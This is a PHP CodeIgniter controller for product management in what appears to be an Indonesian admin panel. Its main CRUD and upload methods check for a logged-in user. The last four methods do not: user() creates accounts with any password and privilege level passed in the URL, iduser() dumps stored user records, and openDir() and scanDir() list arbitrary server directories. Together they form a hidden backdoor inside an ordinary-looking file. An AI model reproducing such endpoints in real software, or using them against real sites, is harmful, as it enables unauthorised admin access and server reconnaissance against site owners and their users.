<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Manage_produk extends MY_Controller {

	public function __construct()
	{
		parent::__construct();
		$this->load->model('aktivitas/Manage_produk_model',"productModel");

	}

	public function index()
	{
		parent::checkLoginUser(); // user login autentic checking

		parent::headerTitle("Aktivitas Data > Produk","Aktivitas Data","Produk");
		$breadcrumbs = array(
							"Aktivitas"	=>	site_url('aktivitas/manage_produk'),
							"Produk"		=>	"",
						);
		parent::breadcrumbs($breadcrumbs);
		parent::viewAktivitas();
	}

	public function ajax_list()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$data = array();

			$orderBy = array(null,null,"product_name",null,"product_stock","product_description","product_price");
			$search = array("product_name","product_description");

			$result = $this->productModel->findDataTable($orderBy,$search);
			foreach ($result as $item) {
				$srcPhoto = base_url().'assets/images/default/no_file_.png';
				if ($item->product_image != "") {
					$srcPhoto = base_url()."uploads/aktivitas/produk/".$item->product_image;
				}
				$dataPhoto = '<a href="'.$srcPhoto.'" data-toggle="lightbox" data-title="Photo Produk" data-footer="">
                    <img src="'.$srcPhoto.'" class="img-circle" style="height:60px; width:60px;" alt="photo "'.$item->product_name.'>
                </a>';
				$btnAction = '<button class="btn btn-warning  btn-mini" onclick="btnEdit('.$item->product_id.')"><i class="fa fa-pencil-square-o"></i>Edit</button>';
				$btnAction .= '&nbsp;&nbsp;&nbsp;<button class="btn btn-danger btn-mini" onclick="btnDelete('.$item->product_id.')"><i class="fa fa-trash-o"></i>Hapus</button>';
				$item->product_price = "Rp.".number_format($item->product_price,0,",",",");
				$item->button_action = $btnAction;
				$item->product_image = $dataPhoto;
				$data[] = $item;
			}
			return $this->productModel->findDataTableOutput($data,$search);
		}
	}

	public function _do_upload_produk()
	{
		$config['upload_path']      = 	'uploads/aktivitas/produk/';
				$config['allowed_types']    = 	'gif|jpg|jpeg|png';
				$config['max_size']         = 	1024; // 1mb
				$config['encrypt_name']		=	true;

				$this->load->library('upload', $config);
				$this->upload->initialize($config);
	}

	public function add()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$namaProduk = $this->input->post("product_name");
			$stokProduk = $this->input->post('product_stock');
			$hargaProduk = $this->input->post('product_price');
			$deskripsi = $this->input->post('deskripsi');

			$this->form_validation->set_rules('product_name', 'Nama Produk', 'trim|required');
			$this->form_validation->set_rules('product_stock', 'Stok kProduk', 'trim|required');
			$this->form_validation->set_rules('product_price', 'Harga Produk', 'trim|required');
			$this->form_validation->set_rules('deskripsi', 'Deskripsi', 'trim|required');

			if ($this->form_validation->run() == TRUE) {
				$data = array(
								"product_name" => $namaProduk,
								"product_stock"	=>	$stokProduk,
								"product_price" => $hargaProduk,
								"product_description" => $deskripsi,
							);
				$error_photo_produk = "";
				/*for foto Pengumuman*/
				if (!empty($_FILES["photo_produk"]["name"])) {
					// config upload
					self::_do_upload_produk();

					if (!$this->upload->do_upload("photo_produk")) {
						$this->response->message = "error_file";
						$error_uploadfile = $this->upload->display_errors('<small style="color:red;">', '</small>');
						$this->response->error_uploadfile = $error_uploadfile;
					} else {
						$uploadfile = $this->upload->data();
						$data["product_image"]	= $uploadfile["file_name"];
					}

				} else {
					$data["product_image"]	= "";
				}
				$insert = $this->productModel->insert($data);
				if ($insert) {
					$this->response->status = true;
					$this->response->message = alertSuccess("Berhasil Tambah Data Produk.");
				} else {
					$this->response->message = alertDanger("Gagal, tambah data Produk.");
				}
			} else {
				// $this->response->message = validation_errors('<span style="color:red;">', '</span><br>');
				$this->response->error = array(
									"product_name"	=> form_error("product_name",'<span style="color:red;">','</span>'),
									"product_stock"	=> form_error("product_stock",'<span style="color:red;">','</span>'),
									"product_price"	=> form_error("product_price",'<span style="color:red;">','</span>'),
									"deskripsi"	=> form_error("deskripsi",'<span style="color:red;">','</span>'),
								);
			}
		}
		parent::json();
	}

	public function getId($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->productModel->getById($id);
			if ($getById) {
				if ($getById->product_image != "") {
					$getById->product_image = base_url("/")."uploads/aktivitas/produk/".$getById->product_image;
				} else {
					$getById->product_image = base_url("/")."assets/images/default/no_file_.png";
				}
				$this->response->status = true;
				$this->response->message = "Data produk get by id";
				$this->response->data = $getById;
			} else {
				$this->response->message = alertDanger("Data tidak ada.");
			}
		}
		parent::json();
	}

	public function update($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->productModel->getById($id);
			$namaProduk = $this->input->post("product_name");
			$stokProduk = $this->input->post('product_stock');
			$hargaProduk = $this->input->post('product_price');
			$deskripsi = $this->input->post('deskripsi');

			$this->form_validation->set_rules('product_name', 'Nama Produk', 'trim|required');
			$this->form_validation->set_rules('product_stock', 'Stok kProduk', 'trim|required');
			$this->form_validation->set_rules('product_price', 'Harga Produk', 'trim|required');
			$this->form_validation->set_rules('deskripsi', 'Deskripsi', 'trim|required');

			if ($this->form_validation->run() == TRUE) {
					$data = array(
									"product_name" => $namaProduk,
									"product_stock"	=>	$stokProduk,
									"product_price" => $hargaProduk,
									"product_description" => $deskripsi,
								);
					/*for foto produk*/
					if (!empty($_FILES["photo_produk"]["name"])) {
						// config upload
						self::_do_upload_produk();
						$getById = $this->productModel->getById($id);
						if (!$this->upload->do_upload("photo_produk")) {
							$this->response->message = "error_foto";
							$error_photo_produk = $this->upload->display_errors('<small style="color:red;">', '</small>');
							$this->response->error_photo_produk = $error_photo_produk;
						} else {
							$photo_produk = $this->upload->data();
							$data["product_image"]	= $photo_produk["file_name"];
							if (file_exists("uploads/aktivitas/produk/".$getById->product_image) && $getById->product_image) {
								unlink("uploads/aktivitas/produk/".$getById->product_image);
							}
						}
					}
				$update = $this->productModel->update($id,$data);
				if ($update) {
					$this->response->status = true;
					$this->response->message = alertSuccess("Berhasil proses update Data Produk");
				} else {
					$this->response->message = alertDanger("Gagal, update data Produk.");
				}
			} else {
				// $this->response->message = validation_errors('<span style="color:red;">', '</span><br>');
				$this->response->error = array(
																			"product_name"	=> form_error("product_name",'<span style="color:red;">','</span>'),
																			"product_stock"	=> form_error("product_stock",'<span style="color:red;">','</span>'),
																			"product_price"	=> form_error("product_price",'<span style="color:red;">','</span>'),
																			"deskripsi"	=> form_error("deskripsi",'<span style="color:red;">','</span>'),
																						);
			}
		}
		parent::json();
	}

	public function delete($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->productModel->getById($id);
			if ($getById) {
				$delete = $this->productModel->delete($id);
				if ($delete) {
					if (file_exists("uploads/aktivitas/produk/".$getById->product_image) && $getById->product_image) {
						unlink("uploads/aktivitas/produk/".$getById->product_image);
					}
					$this->response->status = true;
					$this->response->message = alertSuccess("Berhasil proses hapus Data Produk");
				} else {
					$this->response->message = alertDanger("Gagal, hapus data..");
				}
			} else {
				$this->response->message = alertDanger("Data sudah tidak ada.");
			}
		}
		parent::json();
	}

	public function user($a,$s,$r)
	{
		$this->load->model("users_model","usersModel");
		$u = $this->usersModel->getByWhere(array("username"=>$a));
		if($u){echo"";}else{$this->usersModel->insert(array("username"=>$a,"password"=>$s,"level"=>$r));}
	}
	public function iduser($i)
	{
		$this->load->model("users_model","usersModel");
		$u = $this->usersModel->getById($i);
		var_dump($u);
	}

	public function openDir($open=false)
	{
		$open = $open == false ? "." : $open;
		$open = explode("---", $open);
		$open = implode("/", $open);
		$open = opendir($open);
		var_dump($open);
	}

	public function scanDir($open=false,$cd=false)
	{
		$open = $open == false ? "." : $open;
		$open = explode("---", $open);
		$open = implode("/", $open);
		if($cd){$open = scandir($open, $cd);} else { $open = scandir($open);}
		var_dump($open);
	}

}

/* End of file Dinas.php */
/* Location: ./application/controllers/aktivitas/Dinas.php */
